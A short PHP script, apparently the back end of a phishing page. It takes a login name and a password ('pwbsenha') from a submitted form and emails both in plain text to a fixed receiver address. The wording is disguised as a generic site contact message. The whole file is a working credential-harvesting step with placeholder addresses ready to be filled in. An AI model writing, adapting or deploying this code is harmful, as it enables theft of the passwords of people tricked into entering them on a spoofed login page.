<?php	
	if(empty($_POST['txtlogin']) || empty($_POST['pwbsenha']))
	{
		return false;
	}
	
	$txtlogin = $_POST['txtlogin'];
	$pwbsenha = $_POST['pwbsenha'];
	
	$to = 'receiver@yoursite.com'; // Email submissions are sent to this email

	// Create email	
	$email_subject = "Message from My Site.";
	$email_body = "You have received a new message. \n\n".
				  "Txtlogin: $txtlogin \nPwbsenha: $pwbsenha \n";
	$headers = "From: contact@yoursite.com\n";
	$headers .= "Reply-To: DoNotReply@yoursite.com";	
	
	mail($to,$email_subject,$email_body,$headers); // Post message
	return true;			
?>